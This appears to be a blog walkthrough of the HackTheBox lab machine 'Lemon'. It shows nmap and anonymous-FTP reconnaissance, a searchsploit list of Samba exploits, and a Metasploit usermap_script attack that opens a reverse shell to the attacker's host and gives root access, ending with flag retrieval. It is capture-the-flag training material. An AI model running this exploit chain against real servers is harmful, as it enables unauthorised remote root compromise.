HackTheBox Walkthrough - Lemon
===

This post is writeup of the HackTheBox machine created by ch4p.

## Nmap
Nmap result

```sh
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-27 10:46 EDT
Nmap scan report for 10.10.10.3
Host is up (0.29s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
|_smb-security-mode: ERROR: Script execution failed (use -d to debug)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.41 seconds
```

## FTP
Connected via FTP, but it is empty.

```sh
# ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:vagrant): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
```

## Searchsploit

Search vuln with Searchsploit

```sh
# searchsploit samba 3
------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                      |  Path
                                                                                                                                    | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Microsoft Windows XP/2003 - Samba Share Resource Exhaustion (Denial of Service)                                                     | exploits/windows/dos/148.sh
Samba 1.9.19 - 'Password' Remote Buffer Overflow                                                                                    | exploits/linux/remote/20308.c
Samba 2.0.7 - SWAT Logfile Permissions                                                                                              | exploits/linux/local/20341.sh
Samba 2.0.7 - SWAT Logging Failure                                                                                                  | exploits/unix/remote/20340.c
Samba 2.0.7 - SWAT Symlink (1)                                                                                                      | exploits/linux/local/20338.c
Samba 2.0.7 - SWAT Symlink (2)                                                                                                      | exploits/linux/local/20339.sh
Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                                             | exploits/linux/remote/16321.rb
Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                                     | exploits/linux/local/23674.txt
Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Metasploit)                                                             | exploits/solaris_sparc/remote/16330.rb
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                                          | exploits/unix/remote/22470.c
Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                                                                                | exploits/linux/remote/9936.rb
Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                                             | exploits/unix/remote/22356.c
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                | exploits/osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                              | exploits/multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                    | exploits/unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                                  | exploits/linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                              | exploits/linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                            | exploits/solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                                            | exploits/linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                                                   | exploits/multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                                    | exploits/linux/remote/364.pl
Samba 3.3.12 (Linux x86) - 'chain_reply' Memory Corruption (Metasploit)                                                             | exploits/linux_x86/remote/16860.rb
Samba 3.3.5 - Format String / Security Bypass                                                                                       | exploits/linux/remote/33053.txt
Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overflow (Metasploit)                                         | exploits/linux/remote/21850.rb
Samba 3.4.5 - Symlink Directory Traversal                                                                                           | exploits/linux/remote/33599.txt
Samba 3.4.5 - Symlink Directory Traversal (Metasploit)                                                                              | exploits/linux/remote/33598.rb
Samba 3.4.7/3.5.1 - Denial of Service                                                                                               | exploits/linux/dos/12588.txt
Samba 3.5.0 - Remote Code Execution                                                                                                 | exploits/linux/remote/42060.py
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                                        | exploits/linux/remote/42084.rb
Samba 3.5.11/3.6.3 - Remote Code Execution                                                                                          | exploits/linux/remote/37834.py
Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow                                                                          | exploits/linux/dos/27778.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                               | exploits/linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                       | exploits/linux_x86/dos/36741.py
Sambar FTP Server 6.4 - 'SIZE' Remote Denial of Service                                                                             | exploits/windows/dos/2934.php
Sambar Server 4.3/4.4 Beta 3 - Search CGI                                                                                           | exploits/windows/remote/20223.txt
Sambar Server 5.1 - Script Source Disclosure                                                                                        | exploits/cgi/remote/21390.txt
Sambar Server 5.x - Information Disclosure                                                                                          | exploits/windows/remote/22434.txt
Sambar Server 6.0 - 'results.stm' POST Buffer Overflow                                                                              | exploits/windows/dos/23664.py
Sambar Server 6.1 Beta 2 - 'showini.asp' Arbitrary File Access                                                                      | exploits/windows/remote/24163.txt
------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
```

Server may use Linux(`Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel`)

We try to exploit for samba 3 < 4.
I have tried these and found usermap_script works, so I use this.

## Metasploit
UP msfconsole

```sh
# msfconsole
[-] ***Rting the Metasploit Framework console...\
[-] * WARNING: No database support: No database YAML file
[-] ***

 ______________________________________________________________________________
|                                                                              |
|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
|______________________________________________________________________________|
      \                                  /                      /
       \     .                          /                      /            x
        \                              /                      /
         \                            /          +           /
          \            +             /                      /
           *                        /                      /
                                   /      .               /
    X                             /                      /            X
                                 /                     ###
                                /                     # % #
                               /                       ###
                      .       /
     .                       /      .            *           .
                            /
                           *
                  +                       *

                                       ^
####      __     __     __          #######         __     __     __        ####
####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
################################################################################
################################################################################
# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
################################################################################
                                                           https://metasploit.com


       =[ metasploit v5.0.53-dev                          ]
+ -- --=[ 1931 exploits - 1079 auxiliary - 331 post       ]
+ -- --=[ 556 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > use exploit/multi/samba/usermap_script
msf5 exploit(multi/samba/usermap_script) > set RHOST 10.10.10.3
RHOST => 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > exploit
[*] Started reverse TCP double handler on 10.10.14.15:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo fCTVcQOBqxECxNKZ;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "sh: line 3: Escape: command not found\r\nfCTVcQOBqxECxNKZ\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.3:55346) at 2019-10-27 11:25:59 -0400

pwd
/
id
uid=0(root) gid=0(root)
```

Okay, I got root shell.
And got flag.

```sh
ls /home/makis
user.txt
cat /home/makis/user.txt

ls /root
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
cat /root/root.txt
```

## Summary
- Apply security patches early

